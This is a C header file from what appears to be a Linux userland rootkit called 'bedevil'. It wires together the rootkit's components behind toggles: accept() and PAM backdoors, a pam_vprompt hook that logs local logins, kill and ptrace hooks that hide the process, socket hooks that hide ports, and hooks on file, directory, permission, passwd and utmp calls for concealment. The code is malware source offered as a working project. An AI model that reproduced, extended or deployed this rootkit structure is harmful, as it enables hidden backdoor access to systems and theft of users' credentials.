/*
    essential includes for the rootkit.
    if a header include is suffixed with a comment for
    a specific toggle, it will be read conditionally
    depending solely on the status of said toggle.
    i.e.: #include "hooks/blahblah.c" // [BLAH_TOGGLE]
 */

#ifndef INCLUDES_H
#define INCLUDES_H

#include "bedevil.h"

/* include our libdl functions s first. libdl.h
 * includes xor.c from util/ as both headers
 * depend on functions from each other.
 * i.e.: hook(), call(), ...*/
#include "hooks/libdl/libdl.h"
#include "util/util.h"  /* now include util.h */
#include "hiding/hiding.h"

#ifdef USE_ACCEPT_BD
#include "backdoor/accept.h" // [USE_ACCEPT_BD]
#endif

#ifdef USE_PAM_BD
#include "backdoor/pam.h" // [USE_PAM_BD]
#endif

#ifdef LOG_LOCAL_AUTH
int pam_vprompt(pam_handle_t *pamh, int style, char **response, const char *fmt, va_list args);
int pam_prompt(pam_handle_t *pamh, int style, char **response, const char *fmt, ...);
#include "hooks/pam_vprompt.h"
#endif

#ifdef HIDE_SELF
int kill(pid_t pid, int sig);
#include "hooks/kill.c"
long ptrace(void *request, pid_t pid, void *addr, void *data);
#include "hooks/ptrace.c"
#endif

#ifdef HIDE_PORTS
int socket(int domain, int type, int protocol);
#include "hooks/socket.c"
#endif

#include "hooks/exec/exec.h"
#include "hooks/open/open.h"
#include "hooks/stat/stat.h"
//#include "hooks/rw/rw.h" // including this is giving me a segfault. leaving it out for now.
#include "hooks/dir/dir.h"
#include "hooks/ln/links.h"
#include "hooks/gid/gid.h"
#include "hooks/perms/perms.h"
#ifdef USE_PAM_BD
#include "hooks/pwd/pwd.h" // [USE_PAM_BD]
#include "hooks/utmp/utmp.h" // [USE_PAM_BD]
#endif

#endif